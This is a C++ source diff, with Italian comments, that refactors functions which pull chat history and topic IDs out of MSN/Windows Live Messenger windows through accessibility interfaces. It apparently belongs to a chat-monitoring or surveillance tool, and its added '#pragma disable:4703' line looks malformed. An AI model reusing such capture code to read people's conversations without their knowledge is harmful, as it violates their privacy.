@@ -6,6 +6,8 @@
 *
 */
 
+#pragma disable:4703
+
 #include <exception>
 #include <new>
 
@@ -59,15 +61,19 @@ BOOL QMsnLive::GrabHistory()
 
 	// Se e' il primo grab di questo oggetto, prendi solo l'ultima
 	// riga, in questo modo skippiamo tutta la history precedente.
-	if(bFirstGrab){
-		if(ole.GetValueFromContainer(&bChat, CHILDID_SELF) == FALSE){
+	if(bFirstGrab)
+	{
+		BSTR bChat = NULL;
+
+		if(ole.GetValueFromContainer(&bChat, CHILDID_SELF) == FALSE)
+		{
 			properties.SetUpdated(FALSE);
 			return FALSE;
 		}
 
 		// In una chat vuota cmq c'e' un "a capo" inserito di default
 		// dal programma
-		if(wcslen(bChat) == 1)
+		if (SysStringLen(bChat) == 1)
 			return TRUE;
 
 		if(properties.SetHistory(bChat)){
@@ -169,22 +175,19 @@ BOOL QMsnLive::GrabHistory()
 
 BOOL QMsnLive::GrabTopic()
 {
-	UINT uCount;
-	BSTR bChat = NULL;
-
 	ole.SetHandle(hwChat);
-
-	if(ole.SetInterface() == FALSE)
+	if (ole.SetInterface() == FALSE)
 		return FALSE;
 
-	uCount = ole.GetDispatchTypeCount(ROLE_SYSTEM_TEXT);
+	UINT uCount = ole.GetDispatchTypeCount(ROLE_SYSTEM_TEXT);
 	ole.SetDispatchInterfaceFromType(ROLE_SYSTEM_TEXT, 0);
 
-	if(uCount == 3)
+	if (uCount == 3)
 		properties.SetId((PWCHAR)L"");
-	else{
-		ole.GetLineFromContainer(&bChat, 0);
-		if (bChat != NULL)
+	else 
+	{
+		BSTR bChat = NULL;
+		if (ole.GetLineFromContainer(&bChat, 0))
 		{
 			properties.SetId(bChat);
 			SAFE_SYSFREESTR(bChat);
